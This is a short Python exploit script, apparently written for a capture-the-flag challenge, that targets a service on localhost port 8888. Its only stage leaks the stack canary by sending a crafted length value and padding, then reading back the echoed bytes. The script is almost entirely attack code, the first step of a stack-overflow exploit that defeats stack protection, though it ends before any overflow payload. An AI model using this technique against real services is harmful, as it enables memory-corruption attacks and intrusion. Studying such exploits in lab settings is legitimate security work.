from socket import *
from struct import *

def recv_until(s, data):
	buf = ""
	while True:
		c = s.recv(1)
		buf += c
		if data in buf:
			break
	return buf

host = 'localhost'
port = 8888

'''
hlist = [ "7441202d", "6b636174", "6e656d20", "0a2d2075", "2e312000", "726f7753", "32200a64", "7263532e", "72647765", "72657669" ]
ans=""
for hstr in hlist:
	ans+= "".join(reversed(hstr.decode('hex')))

print ans
'''
s = socket( AF_INET, SOCK_STREAM )
s.connect((host,port))

# STAGE 1: Leak canary
s.send("4\x00\x00\x00")
s.send("y"*10+"\n")

print recv_until(s, "y"*10+"\n")

canary = "\x00" + s.recv(3)
canary = unpack("<L",canary)[0]
print "[+] Leaked canary: " + hex(canary)





